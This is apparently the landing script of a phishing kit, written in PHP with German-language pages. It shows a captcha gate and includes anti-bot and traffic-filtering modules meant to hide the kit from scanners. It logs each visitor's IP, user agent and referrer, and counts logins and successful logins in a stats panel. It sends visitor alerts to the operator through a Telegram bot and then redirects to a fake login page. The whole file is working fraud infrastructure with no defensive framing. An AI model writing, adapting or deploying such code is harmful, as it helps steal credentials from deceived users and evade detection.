<?php
// Only start session if not already started
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Include Telegram configuration and captcha
include './config/telegram.php';
include './captcha.php';

// Handle captcha submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['captcha_answer'])) {
    if (verifyCaptcha($_POST['captcha_answer'])) {
        $_SESSION['captcha_verified'] = true;
        // Redirect to refresh the page
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        // Wrong answer, regenerate captcha
        generateCaptcha();
        $error_message = "Falsche Antwort. Bitte versuchen Sie es erneut.";
    }
}

// Bypass anti-bot protection for local testing
$bypass_antibot = true;

if (!$bypass_antibot) {
    include './antibot.php';
    include './antibot/tds.php';
    include './prevents/genius.php';
    include './antibot/tds.php';
    include './prevents/anti.php';
    include './prevents/anti2.php';
    include './prevents/sub_anti.php';
    include './prevents/block.php';
}

// Check if captcha is already verified
if (!isset($_SESSION['captcha_verified']) || $_SESSION['captcha_verified'] !== true) {
    // Show captcha form
    ?>
    <!DOCTYPE html>
    <html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Bitte bestätigen Sie, dass Sie ein Mensch sind</title>
        <style>
            body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 20px; }
            .captcha-container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .captcha-heading { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 15px; text-align: center; }
            .captcha-subheading { font-size: 16px; color: #333; margin-bottom: 25px; text-align: center; }
            .captcha-question { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 20px; text-align: center; }
            .captcha-input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; }
            .captcha-button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
            .captcha-button:hover { background: #0056b3; }
        </style>
    </head>
    <body>
        <div class="captcha-container">
            <?php if (isset($error_message)): ?>
                <div style="color: red; text-align: center; margin-bottom: 15px;"><?php echo $error_message; ?></div>
            <?php endif; ?>
            <div class="captcha-heading">Bitte bestätigen Sie, dass Sie ein Mensch sind</div>
            <div class="captcha-subheading">Um fortzufahren, lösen Sie bitte das Captcha unten:</div>
            <div class="captcha-question"><?php echo getCurrentCaptcha(); ?></div>
            <form method="POST">
                <input type="text" name="captcha_answer" class="captcha-input" required>
                <button type="submit" class="captcha-button">Bestätigen</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Get visitor information
$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'CLI/Test';
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$time = date('Y-m-d H:i:s');

// Log visitor data
$log_data = [
    'timestamp' => $time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'referer' => $referer
];

// Save to log file
$log_file = './logs/visitors.log';
$log_entry = json_encode($log_data) . "\n";
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Update stats
$stats_file = './app/Panel/stats/stats.ini';
$stats = @parse_ini_file($stats_file);
if (!$stats) {
    $stats = ['visitors' => 0, 'bots' => 0, 'logins' => 0, 'successful_logins' => 0];
}
$stats['visitors']++;
file_put_contents($stats_file, "[stats]\nvisitors = {$stats['visitors']}\nbots = {$stats['bots']}\nlogins = {$stats['logins']}\nsuccessful_logins = {$stats['successful_logins']}\n");

// Telegram Bot 1 - Visitor notification
if ($enable_telegram) {
    $message = "🔔 <b>Neuer Besucher auf der Homepage</b>\n\n";
    $message .= "🌐 <b>IP:</b> $ip\n";
    $message .= "🕒 <b>Zeit:</b> $time\n";
    $message .= "🌍 <b>User Agent:</b> $user_agent\n";
    if ($referer) {
        $message .= "🔗 <b>Referer:</b> $referer\n";
    }
    
    sendTelegramMessage($telegram_bot1_token, $telegram_bot1_chat_id, $message);
}

// Redirect to login page
header("Location: ./views/loginz.php");
exit;
?>
